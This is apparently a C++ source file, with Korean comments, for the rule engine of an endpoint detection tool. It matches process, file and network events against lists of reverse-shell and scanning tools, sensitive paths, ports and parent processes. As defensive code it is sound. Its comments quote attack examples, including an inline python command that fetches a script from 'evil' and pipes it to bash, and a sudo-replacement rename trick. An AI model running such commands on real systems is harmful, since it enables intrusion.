/*
 * rule_engine.cpp - EDR 탐지 룰 데이터베이스 & 매칭 로직
 *
 * ┌─ 룰 매칭 흐름 ─────────────────────────────────────────────────────────┐
 * │                                                                         │
 * │  커널 이벤트                                                            │
 * │  (process_event / file_event / net_event)                              │
 * │          │                                                              │
 * │          ▼                                                              │
 * │  match_rules(e) : 이벤트 타입에 맞는 룰 테이블 순차 검사               │
 * │          │                                                              │
 * │          ▼                                                              │
 * │  helpers: comm_in() / path_has_prefix() / port_in()                   │
 * │    → 문자열 비교(O(k))로 조건 평가 (k = 룰 수)                        │
 * │          │                                                              │
 * │          ▼                                                              │
 * │  std::vector<RuleMatch> 반환 (매칭된 룰만 포함)                        │
 * │                                                                         │
 * └─────────────────────────────────────────────────────────────────────────┘
 *
 * 확장 방향:
 *   - 룰을 JSON 파일로 외부화: nlohmann/json 또는 simdjson 파싱 추가
 *   - 정규식 매칭: std::regex (성능 민감하면 re2 라이브러리)
 *   - 화이트리스트: known-good 프로세스/경로 목록으로 FP 억제
 */
#include "rules/rule_engine.h"
#include <algorithm>    /* std::remove_if */
#include <arpa/inet.h>  /* ntohs() */
#include <cstring>

/* ── 매칭 헬퍼 ─────────────────────────────────────────────────────────── */

static bool starts_with(const char *s, const char *prefix)
{
    return strncmp(s, prefix, strlen(prefix)) == 0;
}

/*
 * get_argv_n: NUL 구분 argv 버퍼에서 n번째 인자 포인터 반환.
 *
 * process_event.argv 는 /proc/PID/cmdline 과 동일한 형식:
 *   "argv0\0argv1\0argv2\0..."
 *
 * 반환값: n번째 인자 시작 주소, 범위 초과 시 nullptr.
 */
static const char *get_argv_n(const char *buf, __u32 n)
{
    size_t off = 0;
    for (__u32 i = 0; i < n; i++) {
        while (off < MAX_ARGV_LEN && buf[off] != '\0') off++;
        off++; /* NUL 건너뜀 */
        if (off >= MAX_ARGV_LEN) return nullptr;
    }
    return (off < MAX_ARGV_LEN) ? buf + off : nullptr;
}

/* null-terminated 문자열 배열에서 comm 검색 (exact match) */
static bool comm_in(const char *comm, const char * const *list)
{
    for (; *list; ++list)
        if (strcmp(comm, *list) == 0) return true;
    return false;
}

/* null-terminated prefix 배열 중 하나로 시작하는지 검사 */
static bool path_has_prefix(const char *path, const char * const *list)
{
    for (; *list; ++list)
        if (starts_with(path, *list)) return true;
    return false;
}

/*
 * null-terminated 포트 배열에서 port 검색.
 * port 는 이미 호스트 바이트 오더(ntohs 변환 후)여야 한다.
 */
static bool port_in(uint16_t port, const uint16_t *list)
{
    for (; *list; ++list)
        if (*list == port) return true;
    return false;
}

/* ── 룰 데이터베이스 ────────────────────────────────────────────────────── */

/*
 * R-001 기준: 공격자가 지속성(Persistence)을 위해 수정하는 전형적 경로.
 * /etc/cron*, /etc/passwd, /etc/shadow, /etc/ld.so.preload 등.
 */
static const char *SENSITIVE_PATHS[] = {
    "/etc/", "/boot/", "/bin/", "/sbin/",
    "/usr/bin/", "/usr/sbin/",
    "/lib/", "/lib64/", "/usr/lib/",
    nullptr
};

/* R-002: 공격자가 증거 인멸을 위해 지우는 경로 */
static const char *LOG_PATHS[] = {
    "/var/log/",
    "/run/log/",
    nullptr
};

/* R-003: 메모리에서 실행된 드로퍼가 /tmp 에 쓰고 실행하는 패턴 */
static const char *TMP_EXEC_PATHS[] = {
    "/tmp/", "/dev/shm/", "/run/shm/", "/var/tmp/",
    nullptr
};

/*
 * R-004: 공격자가 자주 쓰는 리버스셸/C2/정찰 도구.
 * basename 만 비교하므로 /usr/bin/nc 와 nc 모두 매칭.
 */
static const char *SHELL_TOOLS[] = {
    "nc", "ncat", "netcat", "socat",
    "nmap", "masscan",
    "msfconsole", "msfvenom",
    "empire", "covenant",
    nullptr
};

/*
 * R-005: 스크립트 인터프리터 직접 실행.
 * 정상적인 환경에서는 스크립트 파일을 인자로 받지만,
 * 공격자는 종종 -c 'exec(...)' 형태로 인라인 페이로드를 실행한다.
 * → sys_enter_execve 의 argv 파싱은 마일스톤 5+ 에서 추가.
 */
static const char *INTERPRETERS[] = {
    "python", "python2", "python3",
    "perl", "ruby", "php", "lua",
    "node", "nodejs",
    nullptr
};

/*
 * R-006: 정상 트래픽에서 흔한 포트. 이 외의 포트로의 연결은 의심.
 * 실제 환경에서는 조직의 허용 포트 목록으로 대체해야 한다.
 * 마지막 0 은 sentinel (배열 끝 표시).
 */
static const uint16_t COMMON_PORTS[] = {
    /* 표준 프로토콜 */
    21, 22, 25, 53, 80, 110, 143,
    443, 465, 587, 993, 995,
    /* 데이터베이스 */
    1433,              /* MSSQL          */
    3306, 5432,        /* MySQL, Postgres */
    6379, 27017,       /* Redis, MongoDB  */
    /* 웹/API */
    8080, 8443, 8888, 9200,
    /* 개발 서버 (React/Vue/Flask/FastAPI 등) */
    3000, 4200, 5000, 5173, 8000,
    /* 모니터링·오케스트레이션 */
    9090, 9100,        /* Prometheus, node_exporter */
    6443, 10250,       /* Kubernetes API, kubelet   */
    2375, 2376,        /* Docker daemon             */
    0  /* sentinel */
};

/* ── 화이트리스트 ────────────────────────────────────────────────────────── */

/*
 * R-007 화이트리스트: 합법적으로 포트를 바인드하는 알려진 시스템/서버 프로세스.
 *
 * 이 목록에 있는 프로세스의 bind() 는 R-007 에서 제외한다.
 * 웹 서버(nginx 등)와 DB(mysqld 등)는 R-011/R-012 에서 더 정교하게 탐지하므로
 * R-007(low) 중복 발화를 막는다.
 *
 * comm 은 task_struct.comm 으로 최대 15자이므로 긴 이름은 잘린다:
 *   NetworkManager  → "NetworkManage"   (15자)
 *   systemd-resolve → "systemd-resolve" (15자)
 *   containerd-shim → "containerd-shi"  (15자)
 */
static const char *BIND_WHITELIST[] = {
    /* 시스템 데몬 */
    "systemd", "systemd-resolve", "dbus-daemon",
    "NetworkManage",   /* NetworkManager */
    "avahi-daemon", "cupsd", "cups-browsed",
    "rsyslogd", "journald", "snapd",
    /* 원격 접속 */
    "sshd",
    /* 컨테이너/가상화 */
    "dockerd", "containerd", "containerd-shi",
    "libvirtd", "virtlogd",
    /* 웹 서버 (R-011 으로 충분히 커버) */
    "nginx", "apache", "apache2", "httpd", "lighttpd",
    "gunicorn", "uwsgi", "php-fpm",
    /* DB 서버 (R-012 으로 충분히 커버) */
    "mysqld", "mysqld_safe", "mariadbd",
    "postgres", "postmaster",
    "mongod", "redis-server", "memcached",
    nullptr
};

/*
 * R-001 화이트리스트: 패키지 관리자·인스톨러가 시스템 경로에 쓰는 것은 정상.
 *
 * apt/dpkg 가 /usr/bin, /lib 등에 파일을 설치하거나
 * update-alternatives 가 심볼릭 링크를 갱신하는 동작을 FP 로 처리한다.
 *
 * comm 15자 한도:
 *   update-alternatives → "update-alterna"
 *   dpkg-preconfigure  → "dpkg-preconfig"
 */
static const char *SYS_WRITE_WHITELIST[] = {
    "dpkg", "dpkg-unpack", "dpkg-preconfig",
    "apt", "apt-get",
    "update-alterna",  /* update-alternatives */
    "rpm", "yum", "dnf", "zypper",
    "snap", "snapd",
    nullptr
};

/*
 * R-006 화이트리스트: 비표준 포트를 사용하는 것이 정상인 시스템 도구.
 *
 * curl/wget: 사용자가 명시적으로 지정한 포트로 요청 (테스트, API 호출)
 * apt/apt-get: 비표준 포트의 사설 미러 접속
 * git: HTTP/HTTPS 이외의 포트 사용 (기업 내부 Gitea 등)
 * snap: Snap Store 내부 API
 */
static const char *OUTBOUND_WHITELIST[] = {
    "apt", "apt-get", "apt-transport",
    "curl", "wget",
    "git", "git-remote-http",
    "snap", "snapd",
    nullptr
};

/*
 * R-005/R-008 부모 화이트리스트: 패키지 관리자·빌드 도구가 인터프리터를
 * 실행하는 경우는 정상적인 설치/빌드 동작이다.
 *
 * 예:
 *   apt-get install python3-foo  → python3 포스트인스톨 스크립트 실행
 *   pip install xxx              → setup.py 실행 (python3 호출)
 *   make install                 → Makefile 내부에서 python3 호출
 */
static const char *PKG_MANAGER_COMMS[] = {
    "apt", "apt-get", "dpkg", "dpkg-preconfig",
    "pip", "pip3",
    "npm", "yarn", "pnpm",
    "cargo", "rustc",
    "make", "cmake", "ninja",
    "gradle", "mvn",
    nullptr
};

/* ── 이벤트별 룰 매칭 구현 ──────────────────────────────────────────────── */

std::vector<RuleMatch> match_rules(const process_event &e)
{
    std::vector<RuleMatch> hits;

    /* R-003: 임시 디렉터리에서 실행 */
    if (path_has_prefix(e.filename, TMP_EXEC_PATHS))
        hits.push_back({"R-003", "/tmp 경로 실행 (드로퍼 의심)", "high"});

    /* R-004: 리버스셸/공격 도구 실행 */
    if (comm_in(e.comm, SHELL_TOOLS))
        hits.push_back({"R-004", "리버스셸/스캔 도구 실행", "critical"});

    /* R-005: 스크립트 인터프리터 실행 */
    if (comm_in(e.comm, INTERPRETERS))
        hits.push_back({"R-005", "스크립트 인터프리터 실행", "medium"});

    /* R-008: root 권한으로 인터프리터 실행 (권한 상승 후 페이로드 실행 의심) */
    if (e.uid == 0 && comm_in(e.comm, INTERPRETERS))
        hits.push_back({"R-008", "root 권한 인터프리터 실행", "critical"});

    /*
     * R-010: 인터프리터 + -c 플래그 (인라인 페이로드 실행).
     *
     * 공격 패턴:
     *   python3 -c "import os; os.system('curl http://evil/sh | bash')"
     *   perl -e 'use Socket; ...'   # 리버스셸 원라이너
     *   node -e 'require("child_process").exec(...)'
     *
     * -c / -e 플래그는 인터프리터가 스크립트 파일 없이 인라인 코드를 실행하게 하므로
     * 파일리스(fileless) 공격의 핵심 지표다.
     * argv[1] (comm 다음 첫 인자)에서 이를 감지한다.
     */
    if (comm_in(e.comm, INTERPRETERS) && e.argc >= 2) {
        const char *arg1 = get_argv_n(e.argv, 1);
        if (arg1 && (strcmp(arg1, "-c") == 0 || strcmp(arg1, "-e") == 0))
            hits.push_back({"R-010", "인터프리터 인라인 페이로드 (-c/-e 플래그)", "high"});
    }

    return hits;
}

std::vector<RuleMatch> match_rules(const file_event &e)
{
    std::vector<RuleMatch> hits;

    if (e.type == EVENT_FILE_WRITE || e.type == EVENT_FILE_RENAME) {
        /*
         * R-001: 시스템 바이너리/설정 파일 수정.
         * SYS_WRITE_WHITELIST: apt/dpkg 등 패키지 관리자의 합법적 설치 동작 제외.
         */
        if (path_has_prefix(e.path, SENSITIVE_PATHS) &&
            !comm_in(e.comm, SYS_WRITE_WHITELIST))
            hits.push_back({"R-001", "시스템 경로 파일 수정", "high"});
    }

    if (e.type == EVENT_FILE_DELETE) {
        /* R-002: 로그 파일 삭제 (증거 인멸) */
        if (path_has_prefix(e.path, LOG_PATHS))
            hits.push_back({"R-002", "로그 파일 삭제 (증거 인멸 의심)", "high"});
    }

    if (e.type == EVENT_FILE_RENAME) {
        /*
         * R-009: /tmp 에서 시스템 경로로 rename.
         * TOCTOU + rename 원자성을 악용한 권한 상승 기법:
         *   1) /tmp/evil 에 악성 파일 생성
         *   2) renameat2(RENAME_EXCHANGE) 로 /usr/bin/sudo 와 원자 교체
         */
        if (path_has_prefix(e.path, TMP_EXEC_PATHS) &&
            path_has_prefix(e.path2, SENSITIVE_PATHS))
            hits.push_back({"R-009", "/tmp → 시스템 경로 rename (TOCTOU 의심)", "critical"});
    }

    return hits;
}

std::vector<RuleMatch> match_rules(const net_event &e)
{
    std::vector<RuleMatch> hits;
    uint16_t port = ntohs(e.dport);

    if (e.type == EVENT_NET_CONNECT && port != 0) {
        /*
         * R-006: 비표준 포트 아웃바운드 연결.
         * OUTBOUND_WHITELIST: curl/wget/apt 등 도구는 사용자가 의도적으로
         * 지정한 포트를 사용하므로 제외한다.
         */
        if (!port_in(port, COMMON_PORTS) && !comm_in(e.comm, OUTBOUND_WHITELIST))
            hits.push_back({"R-006", "비표준 포트 아웃바운드 연결", "medium"});
    }

    if (e.type == EVENT_NET_BIND && port != 0) {
        /*
         * R-007: 서버 포트 바인드 (백도어 리스너 의심).
         * BIND_WHITELIST: 합법적인 서버 프로세스(sshd, nginx, mysqld 등) 제외.
         * 웹·DB 서버는 R-011/R-012 에서 더 정교하게 탐지되므로
         * R-007(low) 중복 발화를 막는다.
         */
        if (!comm_in(e.comm, BIND_WHITELIST))
            hits.push_back({"R-007", "서버 포트 바인드 (알 수 없는 프로세스)", "low"});
    }

    return hits;
}

/* ── 프로세스 트리 기반 룰 ──────────────────────────────────────────────── */

/*
 * 웹 서버: HTTP 요청을 받아 처리하는 서비스.
 * 이 목록의 프로세스가 셸/인터프리터를 직접 exec() 하면 웹셸 실행으로 판단.
 * MITRE ATT&CK T1190 (Exploit Public-Facing Application) + T1059.
 */
static const char *WEB_SERVERS[] = {
    "nginx", "apache", "apache2", "httpd", "lighttpd",
    "caddy", "traefik", "gunicorn", "uwsgi", "php-fpm",
    nullptr
};

/*
 * DB 서버: SQL/NoSQL 데이터베이스 데몬.
 * 셸을 직접 spawn 하는 경우는 SQL injection → OS command execution 의심.
 * MITRE ATT&CK T1190 + T1059.
 */
static const char *DB_SERVERS[] = {
    "mysqld", "mysqld_safe", "mariadbd",
    "postgres", "postmaster",
    "mongod", "redis-server", "memcached",
    nullptr
};

/*
 * 유닉스 셸: 인터랙티브/스크립트 실행 셸.
 * 서비스 데몬이 이 목록을 직접 exec() 하면 명령 실행(RCE) 의심.
 */
static const char *SHELLS[] = {
    "bash", "sh", "dash", "zsh", "ksh", "fish", "tcsh", "csh",
    nullptr
};

std::vector<RuleMatch> match_rules(const process_event &e, const char *parent_comm)
{
    /* 기존 단독 이벤트 룰 먼저 수집 */
    auto hits = match_rules(e);

    /*
     * R-005/R-008 FP 억제: 패키지 관리자·빌드 도구가 부모인 경우.
     *
     * apt install python3-package → postinst 스크립트에서 python3 호출
     * pip install xxx             → setup.py 빌드 중 python3 호출
     * make install                → Makefile 에서 python3 호출
     *
     * 이 경우 R-005(medium)/R-008(critical) 이 FP로 발화한다.
     * std::remove_if 로 해당 룰을 hits 에서 제거한다.
     */
    if (parent_comm && comm_in(parent_comm, PKG_MANAGER_COMMS)) {
        hits.erase(
            std::remove_if(hits.begin(), hits.end(),
                [](const RuleMatch &m) {
                    return strcmp(m.id, "R-005") == 0 ||
                           strcmp(m.id, "R-008") == 0;
                }),
            hits.end());
    }

    if (!parent_comm || parent_comm[0] == '\0')
        return hits;

    bool child_is_shell = comm_in(e.comm, SHELLS);
    bool child_is_interp = comm_in(e.comm, INTERPRETERS);

    /*
     * R-011: 웹 서버 자식 프로세스가 셸 또는 인터프리터를 실행.
     *
     * 정상 경로: nginx worker → [요청 처리] (fork/exec 없음)
     * 이상 경로: nginx → bash  ← 웹셸이 system() / proc_open() 호출
     *
     * PHP-FPM 이 php 스크립트를 exec() 하는 것은 정상이지만,
     * php-fpm → bash 는 비정상이다.
     */
    if (comm_in(parent_comm, WEB_SERVERS) && (child_is_shell || child_is_interp))
        hits.push_back({"R-011", "웹 서버 자식 셸 실행 (웹셸/RCE 의심)", "critical"});

    /*
     * R-012: DB 서버 자식 프로세스가 셸 또는 인터프리터를 실행.
     *
     * mysqld → bash : SQL injection + INTO OUTFILE + xp_cmdshell 유사 패턴
     * postgres → sh : COPY TO PROGRAM 을 통한 OS 명령 실행 (CVE-2019-9193 류)
     */
    if (comm_in(parent_comm, DB_SERVERS) && (child_is_shell || child_is_interp))
        hits.push_back({"R-012", "DB 서버 자식 셸 실행 (SQLi RCE 의심)", "critical"});

    return hits;
}

/* ── 유틸리티 ───────────────────────────────────────────────────────────── */

const char *severity_color(const char *severity)
{
    /* ANSI 이스케이프: \033[<code>m
     *   1  = bold
     *   31 = red, 33 = yellow, 34 = blue, 35 = magenta, 0 = reset
     */
    if (strcmp(severity, "critical") == 0) return "\033[1;35m"; /* 굵은 자홍 */
    if (strcmp(severity, "high")     == 0) return "\033[1;31m"; /* 굵은 빨강 */
    if (strcmp(severity, "medium")   == 0) return "\033[1;33m"; /* 굵은 노랑 */
    if (strcmp(severity, "low")      == 0) return "\033[1;34m"; /* 굵은 파랑 */
    return "\033[0m";
}
